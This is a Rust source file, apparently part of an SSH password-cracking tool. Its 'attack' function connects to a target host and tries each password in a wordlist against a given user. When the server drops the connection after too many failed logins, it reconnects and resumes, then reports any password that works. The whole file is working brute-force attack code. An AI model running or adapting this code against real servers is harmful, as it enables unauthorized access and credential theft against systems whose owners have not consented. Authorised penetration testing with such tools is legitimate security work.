use anyhow::{Context, Error, Ok};
use ssh2;
use std::net::TcpStream;
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::result::Result;

use crate::library;

/// Convert the session error code into a simple enum we can match on.
#[derive(Debug, PartialEq)]
enum SessionError {
    Closed,                 // Session(-7)
    FailedAuthAndClosed,    // Session(-13)
    BadPassword,            // Session(-18)
    Other(String),          // Anything else
}

impl From<&ssh2::Error> for SessionError {
    fn from(err: &ssh2::Error) -> Self {
        match err.code().to_string().as_str() {
            "Session(-7)" => SessionError::Closed,
            "Session(-13)" => SessionError::FailedAuthAndClosed,
            "Session(-18)" => SessionError::BadPassword,
            other => SessionError::Other(other.to_owned()),
        }
    }
}

fn ssh_socket(addr: &str, port: u16) -> Result<ssh2::Session, Error> {
    // Connect to the local SSH server
    let addr: IpAddr = addr.parse().expect("parse failed");
    let socket = SocketAddr::from((addr, port));
    let mut session = ssh2::Session::new().unwrap();
    let tcp = TcpStream::connect(socket).unwrap();
    session.set_tcp_stream(tcp);
    session.handshake().unwrap();
    Ok(session)
}

pub fn attack(
    addr: String,
    port: u16,
    user: String,
    wordlist_path: PathBuf,
    config: library::Config,
) -> Result<bool, Error> {
    let mut cracked = false;

    let mut session = ssh_socket(&addr, port).unwrap_or_else(|e| {eprintln!("Error establishing the connection: {e}"); panic!()});
    println!("Connected to {user}@{addr}:{port}");

    let string_wordlist = std::fs::read_to_string(wordlist_path).unwrap();

    println!("Starting to crack!");
    for line in string_wordlist.lines() {
        let attempt = session.userauth_password(&user, line);
        match attempt {
            std::result::Result::Ok(()) => {
                println!("Match Found!\nPassword: {}", &line);
                cracked = true;
                break;
            }
            Err(err) => {
                match SessionError::from(&err) {
                    SessionError::Closed | SessionError::FailedAuthAndClosed => {
                        if config.verbose {
                            println!("Connection closed with \"{err}\", likely due to incorrect password limit reached.");
                            println!("Re-establishing...");
                        }
                        session = ssh_socket(&addr, port).unwrap_or_else(|e| {eprintln!("Error re-establishing the connection: {e}"); panic!()});
                        match session.userauth_password(&user, line) {
                            std::result::Result::Ok(()) => {
                                println!("Match Found!\nPassword: {}", &line);
                                cracked = true;
                                break;
                            }
                            Err(_) => {
                                if config.verbose {println!("Tried: {}", &line);}
                            }
                        }
                    }
                    SessionError::BadPassword => {
                        // go to the next password in the list
                        if config.verbose {println!("Tried: {}", &line);}
                    }
                    SessionError::Other(err) => {
                        // other error

                        // TODO:
                        // handle  Error { code: Session(-5), msg: "Unable to exchange encryption keys" }
                        eprintln!("Unknown error: {}", err);
                        session = ssh_socket(&addr, port).unwrap_or_else(|e| {eprintln!("Error re-establishing the connection: {e}"); panic!()});
                    }
                }
            }
        }
    }
    Ok(cracked)
}
